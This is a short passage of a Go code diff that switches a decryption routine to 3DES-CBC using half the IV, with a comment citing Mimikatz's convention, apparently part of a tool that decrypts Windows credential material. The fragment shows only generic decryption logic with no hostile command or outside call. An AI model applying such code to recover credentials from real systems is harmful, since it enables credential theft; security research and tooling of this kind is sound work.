-	block.Decrypt(decrypted[8:16], data[8:16])
+	// 3DES-CBC uses first 8 bytes of IV (Mimikatz: cbIV = sizeof(IV) / 2)
+	mode := cipher.NewCBCDecrypter(block, iv[:8])
+	decrypted := make([]byte, len(data))
+
+	// Ensure data is multiple of 8 bytes (3DES block size)
+	if len(data)%8 != 0 {
+		return data
+	}
+
+	mode.CryptBlocks(decrypted, data)
 	return decrypted
 }
